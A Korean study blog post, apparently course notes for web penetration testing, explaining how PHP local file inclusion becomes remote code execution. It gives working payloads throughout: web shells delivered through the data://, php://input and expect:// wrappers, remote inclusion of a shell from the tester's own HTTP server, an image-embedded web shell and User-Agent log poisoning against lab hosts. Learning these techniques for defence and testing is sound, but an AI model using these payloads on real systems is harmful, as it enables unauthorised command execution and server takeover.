---
title: "LFI - Remote Code Execution"
date: 2026-07-14
layout: single
excerpt: "취약한 애플리케이션이 사용자 입력값을 검증하지 않고 그대로 include 함수에 전달한다면, 공격자는 PHP Wrapper, 로그 포이즈닝, RFI, 파일 업로드와의 연계 등을 통해 일반 파일이 아닌 PHP 코드를 include하도록 만들 수 있다. 이 경우 서버는 공격자가 전달한 PHP 코드를 실행하게 되고, 결과적으로 Remote Code Execution으로 이어질 수 있다."
author_profile: true
toc: true
toc_label: "LFI"
toc_icon: "book"
toc_sticky: true
categories: [cpts-web]
tags: [web, cpts, lfi]
---

LFI는 단순히 파일을 읽는 것에서 끝나는 취약점이 아니다.

취약한 애플리케이션이 사용자 입력값을 검증하지 않고 그대로 include 함수에 전달한다면, 공격자는 PHP Wrapper, 로그 포이즈닝, RFI, 파일 업로드와의 연계 등을 통해 일반 파일이 아닌 PHP 코드를 include하도록 만들 수 있다. 이 경우 서버는 공격자가 전달한 PHP 코드를 실행하게 되고, 결과적으로 Remote Code Execution으로 이어질 수 있다.

# PHP Wrappers

## Checking PHP Configurations

PHP Wrapper를 이용한 RCE를 시도하기 전에 먼저 확인해야 할 중요한 설정이 있다:

```text
allow_url_include = On
```

`allow_url_include` 는 PHP의 `include`, `require` 같은 함수에서 URL Wrapper 기반 리소스를 `include` 할 수 있는지 결정하는 설정이다.

일반적인 LFI는 `/etc/passwd` 와 같은 서버 내부의 로컬 파일을 `include` 하여 내용을 노출시키는 방식으로 동작한다. 

하지만 `allow_url_include` 옵션이 활성화되어 있으면 `data://`, `php://input`, `http://` 같은 Wrapper를 `include` 대상으로 사용할 수 있다.

현재 서버에서 해당 옵션이 활성화되어 있는지 확인하기 위해 `php.ini` 파일을 `php://filter` 를 이용해 Base64로 인코딩한 뒤 확인한다:

```bash
$ curl "http://154.57.164.74:31046/index.php?language=php://filter/read=convert.base64-encode/resource=/etc/php/7.4/apache2/php.ini"

<!DOCTYPE html>
<html lang="en">
# SKIP

<div class="description">
    <h1>History</h1>
    <h2>Containers</h2>
    W1BIUF0KCjs7Ozs7Ozs7Ozs7Ozs7Ozs7OzsKOyBBYm91dCBwaHAuaW5pICAgOwo7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7CjsgUEhQJ3MgaW5pdGlhbGl6YXRpb24gZmlsZSwgZ2VuZXJhbGx5IGNhbGxlZCG

# SKIP
</html>
```

응답에서 확인된 Base64 문자열을 디코딩한 뒤 `allow_url_include` 값을 확인하면 다음과 같이 `On` 으로 설정되어 있는 것을 볼 수 있다:

```bash
$ echo "<base64>" | base64 -d | grep allow_url_include

allow_url_include = On
```

따라서 현재 서버에서는 `data://`, `php://input` 과 같은 PHP Wrapper를 이용한 RCE 공격을 시도할 수 있다.

## Remote Code Execution

우선 `data://` Wrapper에 전달할 PHP 웹 셸 코드를 Base64로 인코딩한다:

```bash
$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

이 값을 `data://text/plain;base64,` 뒤에 붙여서 `include` 대상으로 전달하면, 서버는 Base64로 인코딩된 PHP 코드를 디코딩한 뒤 실행하게 된다:

```text
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2bCg==
```

URL에서 `+` 문자는 공백으로 처리될 수 있으므로 `%2b` 로 URL Encoding하여 전달한다.

이후 `cmd` 파라미터를 통해 실행할 명령어를 전달하면, 다음과 같이 `id` 명령어의 실행 결과를 확인할 수 있다:

![LFI](/assets/cpts-web/lfi-remote-code-execution/lfi1.png)

`data://` Wrapper 외에도 `php://input` Wrapper를 이용할 수 있다:

```text
php://input
```

`php://input` 은 HTTP 요청의 Body 데이터를 `include` 대상으로 사용할 수 있는 Wrapper이다. 

따라서 POST 요청의 Body 부분에 PHP 웹 셸 코드를 넣고, URL의 `cmd` 파라미터로 실행할 명령어를 전달하면 RCE를 수행할 수 있다:

![LFI](/assets/cpts-web/lfi-remote-code-execution/lfi2.png)

마지막으로 `expect://` Wrapper를 사용할 수도 있다:

```text
expect://id
```

`expect://` Wrapper는 앞에서 사용한 방식과 다르게 PHP 웹 셸 코드를 따로 전달하지 않아도 된다. 

`expect://` 뒤에 실행할 시스템 명령어를 넣으면 해당 명령어를 직접 실행할 수 있다.

다만 `expect` 는 PHP의 기본 Wrapper가 아니라 외부 확장 모듈이기 때문에, 서버에 설치되어 있고 활성화되어 있어야 사용할 수 있다. 

이를 확인하기 위해 앞에서 읽어온 `php.ini` 파일에서 `expect` 설정을 검색한다:

```bash
$ echo "<base64>" | base64 -d | grep extension

# SKIP
extension=expect
```

이처럼 `expect://` Wrapper가 정상적으로 동작한다면, 별도의 웹 셸 코드를 전달하지 않고도 시스템 명령어를 직접 실행할 수 있다.

# Remote File Inclusion (RFI)

## Remote Code Execution with RFI

RFI(`Remote File Inclusion`)는 원격 서버에 있는 파일을 포함(`include`)하는 취약점이다.

PHP에서는 일반적으로 `allow_url_include=On` 이어야 `include()` 가 원격 URL을 받아들일 수 있다.

먼저 공격자는 자신의 PC에서 간단한 HTTP 서버를 실행한다:

```bash
$ python3 -m http.server 8000
```

그리고 웹 셸을 하나 만든다:

```php
<?php system($_GET["cmd"]); ?>
```

이를 `shell.php` 라는 이름으로 저장한다고 하자.

피해 서버에 다음과 같은 취약 코드가 있다고 가정하면:

```php
include($_GET['language']);
```

다음과 같이 요청할 수 있다:

```text
http://10.129.29.114/index.php?language=http://10.10.14.225:8000/index.php&cmd=id
```

실행 결과는 다음과 같이 나타난다:

![LFI](/assets/cpts-web/lfi-remote-code-execution/lfi3.png)

# LFI and File Uploads

LFI는 파일 업로드 기능과 결합하여 RCE로 이어질 수 있다.

일반적으로 이미지 파일 안에 PHP 코드를 넣어 업로드하더라도, 웹 서버가 해당 파일을 단순 이미지로 제공하면 PHP 코드는 실행되지 않는다.

하지만 업로드한 파일을 `include()` 또는 `require()`와 같이 코드 실행이 가능한 함수로 불러오면, 파일 확장자가 `.jpg`, `.png`, `.gif` 와 같은 이미지 형식이어도 파일 내부의 PHP 코드가 실행될 수 있다.

## Gaining RCE via Image Upload and LFI

`.png`(또는 `.gif`, `.jpg`)와 같은 이미지 파일 내부에 PHP 웹 셸 코드를 삽입한다:

```php
<?php system($_GET["cmd"]); ?>
```

이후 웹 사이트의 파일 업로드 기능을 이용하여 해당 이미지를 업로드한다:

![LFI](/assets/cpts-web/lfi-remote-code-execution/lfi4.png)

업로드가 완료되면 업로드된 이미지의 경로를 확인한 뒤, LFI 취약점이 존재하는 `include()` 대상에 해당 파일을 지정한다.

예를 들어 업로드된 파일이 `/profile_images/shell.png` 에 저장되었다면 다음과 같이 요청할 수 있다:

```text
http://154.57.164.67:32267/index.php?language=./profile_images/shell.png&cmd=id
```

내부적으로 `include()` 가 업로드한 파일을 읽으면서 파일 내부의 PHP 코드가 실행되고, `cmd` 파라미터를 통해 시스템 명령을 수행할 수 있다:

![LFI](/assets/cpts-web/lfi-remote-code-execution/lfi5.png)

# Log Poisoning

웹 서버의 `access.log` 와 같은 로그 파일을 LFI와 결합하면 RCE로 이어질 수 있다.

Apache의 `access.log` 에는 웹 서버로 들어온 HTTP 요청 정보가 기록된다. 

일반적으로 클라이언트 IP, 요청 시간, 요청 경로, 응답 상태 코드, `Referer`, `User-Agent` 등의 정보가 포함된다:

![LFI](/assets/cpts-web/lfi-remote-code-execution/lfi6.png)

로그 내용을 확인하면 요청 경로와 상태 코드, `User-Agent` 등의 값이 그대로 기록되어 있는 것을 볼 수 있다.

이 중 `User-Agent` 헤더는 사용자가 직접 조작할 수 있으므로, 먼저 다음과 같은 PHP 코드를 삽입하여 코드 실행 여부를 확인할 수 있다:

```text
User-Agent: <?php phpinfo(); ?>
```

해당 헤더를 포함한 요청을 보내면 PHP 코드가 `access.log` 에 기록된다.

이후 LFI 취약점을 통해 `access.log` 를 다시 `include` 하면, 로그 내부에 삽입한 PHP 코드가 실행되어 `phpinfo()` 페이지가 출력된다:

![LFI](/assets/cpts-web/lfi-remote-code-execution/lfi7.png)

코드 실행이 확인되었다면 `User-Agent` 에 다음과 같은 PHP 웹 셸을 삽입할 수 있다:

```text
User-Agent: <?php system($_GET['cmd']); ?>
```

헤더를 포함한 요청을 전송한 뒤, `cmd` 파라미터에 실행할 명령을 전달하게 되면 피해 서버에서 해당 시스템 명령이 실행된다:

![LFI](/assets/cpts-web/lfi-remote-code-execution/lfi8.png)
